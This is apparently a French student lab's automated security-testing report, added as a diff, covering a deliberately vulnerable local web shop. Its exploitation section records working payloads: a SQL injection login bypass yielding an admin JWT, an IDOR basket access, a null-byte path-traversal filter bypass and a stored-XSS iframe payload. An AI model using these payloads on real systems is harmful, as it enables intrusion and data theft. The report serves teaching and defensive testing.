@@ -1,0 +1,179 @@
+================================================================
+  RAPPORT FINAL — LAB 1 : Tests de sécurité automatisés
+  Date  : 2026-08-10 19:06:53
+  Cible : http://localhost:3000
+  Build : #local
+================================================================
+
+━━━━ test_api_security_report.txt ━━━━
+============================================================
+ TEST 05 — Exposition APIs
+ Date  : 2026-08-10 19:06:40
+ Cible : http://localhost:3000
+============================================================
+
+[TEST] Liste utilisateurs — /api/Users — HTTP 401
+  [OK] Endpoint protégé
+
+[TEST] Feedbacks — /api/Feedbacks — HTTP 200
+  [CRITICAL] Données sensibles exposées sans authentification
+
+[TEST] Config admin — /rest/admin/application-configuration — HTTP 200
+  [CRITICAL] Données sensibles exposées sans authentification
+
+[TEST] Répertoire FTP — /ftp/ — HTTP 200000
+  [INFO] Extrait : <!DOCTYPE html><html>  <head>    <meta charset='utf-8'>     <meta name="viewport" content="width=device-width, initi...
+
+ RÉSULTAT : FAILURE
+ RÉFÉRENCE : A01:2021 / A02:2021
+============================================================
+
+━━━━ test_auth_report.txt ━━━━
+============================================================
+ TEST 04 — Authentification
+ Date  : 2026-08-10 19:06:40
+ Cible : http://localhost:3000
+============================================================
+
+[TEST] SQL Injection sur /rest/user/login
+  Payload : ' OR '1'='1'--
+  HTTP    : 200
+  [CRITICAL] SQLi réussie — JWT retourné sans credentials valides
+
+[TEST] Verbosité des messages d'erreur
+  Réponse : Invalid email or password.
+
+[TEST] Rate limiting (5 tentatives rapides)
+  [WARN] Pas de rate limiting détecté après 5 tentatives
+
+ RÉSULTAT : FAILURE
+ RÉFÉRENCE : A03:2021 / A07:2021
+============================================================
+
+━━━━ test_exploitation_report.txt ━━━━
+============================================================
+ TEST 06 — Phase d'exploitation
+ Date   : 2026-08-10 19:06:52
+ Cible  : http://localhost:3000
+ Build  : local
+============================================================
+
+=== EXP-01 — SQL Injection → JWT admin ===
+  [EXPLOIT RÉUSSI] JWT admin obtenu
+  Token (60c) : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ...
+  Identité : 
+
+=== EXP-02 — IDOR : Accès aux paniers ===
+  Compte attaquant : attacker_23568@lab.local
+  [EXPLOIT RÉUSSI] Panier ID=1 accessible sans en être propriétaire (HTTP 200)
+
+=== EXP-03 — Path Traversal /ftp/ ===
+  [TÉLÉCHARGÉ] /ftp/acquisitions.md — HTTP 200
+  [TÉLÉCHARGÉ] /ftp/legal.md — HTTP 200
+  [HTTP 403] /ftp/eastere.gg
+  [HTTP 403] /ftp/package.json.bak
+  [NULL BYTE] /ftp/package.json.bak%2500.md → HTTP 200
+  [BYPASS RÉUSSI] Filtre d'extension contourné
+
+=== EXP-04 — XSS Stocké dans /api/Feedbacks ===
+  Payload : <iframe src="javascript:alert(`Jenkins-XSS-EXP04`)"></iframe>
+  HTTP    : 500
+
+Preuves dans : /home/virus-one/cours_simac_l3/Semestre_6/Sec_data/projet/labs_v2/lab1-jenkins/captures/reports/evidence
+  EXP01_jwt_admin.txt
+  EXP01_request.json
+  EXP01_response.json
+  EXP01_whoami.json
+  EXP02_basket_1.json
+  EXP03_acquisitions.md.txt
+  EXP03_legal.md.txt
+  EXP03_nullbyte_package.json.bak.txt
+  EXP04_xss_request.json
+
+ RÉSULTAT : FAILURE — Vulnérabilités exploitées
+============================================================
+
+━━━━ test_headers_report.txt ━━━━
+============================================================
+ TEST 02 — En-têtes HTTP de sécurité
+ Date  : 2026-08-10 19:06:33
+ Cible : http://localhost:3000
+============================================================
+
+--- En-têtes bruts ---
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Accept-Ranges: bytes
+Cache-Control: public, max-age=0
+Last-Modified: Mon, 10 Aug 2026 18:48:16 GMT
+ETag: W/"26af-19fed010a30"
+Content-Type: text/html; charset=UTF-8
+Content-Length: 9903
+Vary: Accept-Encoding
+Date: Mon, 10 Aug 2026 19:06:33 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+
+--- Analyse ---
+[MANQUANT] [CRITICAL] Strict-Transport-Security
+[MANQUANT] [CRITICAL] Content-Security-Policy
+[PRÉSENT]  [CRITICAL] X-Content-Type-Options: nosniff
+[PRÉSENT]  [WARNING] X-Frame-Options: SAMEORIGIN
+[MANQUANT] [WARNING] Referrer-Policy
+
+--- En-têtes indésirables ---
+[OK]       X-Powered-By — correctement absent
+[OK]       Server — correctement absent
+
+ RÉSULTAT : FAILURE
+ RÉFÉRENCE : A05:2021 — Security Misconfiguration
+============================================================
+
+━━━━ test_http_report.txt ━━━━
+============================================================
+ TEST 01 — Disponibilité HTTP
+ Date  : 2026-08-10 19:06:33
+ Cible : http://localhost:3000
+============================================================
+[PASS] Page d'accueil — HTTP 200
+[PASS] API Challenges — HTTP 200
+[FAIL] API Users — HTTP 401 (attendu 200)
+[PASS] Endpoint whoami — HTTP 200
+[FAIL] Page inexistante (404 attendu) — HTTP 200 (attendu 404)
+
+ RÉSULTAT : FAILURE
+============================================================
+
+━━━━ test_methods_report.txt ━━━━
+============================================================
+ TEST 03 — Méthodes HTTP
+ Date  : 2026-08-10 19:06:33
+ Cible : http://localhost:3000
+============================================================
+
+--- Méthodes standard ---
+[INFO] GET — HTTP 200
+[INFO] POST — HTTP 200
+[INFO] HEAD — HTTP 200000
+[INFO] OPTIONS — HTTP 204
+
+--- Méthodes dangereuses ---
+[WARN] TRACE — HTTP 200 — méthode potentiellement dangereuse
+[WARN] PUT — HTTP 200 — méthode potentiellement dangereuse
+[WARN] DELETE — HTTP 200 — méthode potentiellement dangereuse
+[WARN] CONNECT — HTTP 000000 — méthode potentiellement dangereuse
+
+ RÉSULTAT : FAILURE — TRACE actif
+ RÉFÉRENCE : A05:2021 / OTG-CONFIG-006
+============================================================
+
+================================================================
+  Tests exécutés : 6
+  En échec       : 6
+  En succès      : 0
+================================================================
